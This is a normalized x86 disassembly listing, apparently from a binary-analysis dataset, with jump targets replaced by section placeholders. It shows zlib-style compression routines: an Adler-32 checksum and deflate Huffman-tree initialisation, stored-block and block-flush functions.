cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call calloc
add esp 0x8
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
sub_407520
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
and eax 0xffff
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
shr ecx 0x10
and ecx 0xffff
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x10
or eax [ ebp - 0x4 ]
cmp [ ebp + 0x10 ] 0x15b0
jae r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x15b0
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x2 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x3 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x5 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x6 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x7 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x9 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xa ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xb ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xd ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xe ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xf ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x10
mov [ ebp + 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x10
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0xc ]
mov [ ebp + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x10
jl r-xdata
sub_4077a0
push ebp
mov ebp esp
call sub_407836
mov eax [ ebp + 0x8 ]
add eax 0x8c
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb18 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0x980
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb1c ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb24 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0xa74
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb28 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb30 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16ac ] 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_40783b
add esp 0x4
pop ebp
retn
sub_40783b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x11e
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1e
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x13
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x48c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0xa74 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_407904
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
push 0x1
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40aa82
add esp 0x10
mov esp ebp
pop ebp
retn
sub_407a43
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x8 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x8 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0xc ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0xc ] eax
mov ecx 0x10
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16ac ] 0x7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40a8dd
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16ac ]
add ecx 0xb
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x16b4 ]
cmp ecx 0x9
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x18 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x18 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x1c ] eax
mov ecx 0x10
sub ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40a8dd
add esp 0x4
sub_407f32
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x7c ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x5
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1c ]
cmp edx 0x2
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0xb10
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4082ee
add esp 0x8
mov eax [ ebp + 0x8 ]
add eax 0xb1c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4082ee
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_408c25
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx 0xa
shr ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a4 ]
add eax 0xa
shr eax 0x3
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40a7ea
add esp 0x4
mov [ ebp - 0x18 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov [ ebp - 0x10 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407904
add esp 0x10
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
add edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x14 ]
add edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
add edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40783b
add esp 0x4
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
cmp edx [ ebp - 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9c6
add esp 0x4
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb20 ]
add ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb14 ]
add eax 0x1
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_408e79
add esp 0x10
mov edx [ ebp + 0x8 ]
add edx 0x980
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409fa2
add esp 0xc
push r--data
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_409fa2
add esp 0xc
jmp r-xdata
sub_4082ee
push ebp
mov ebp esp
sub esp 0x24
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
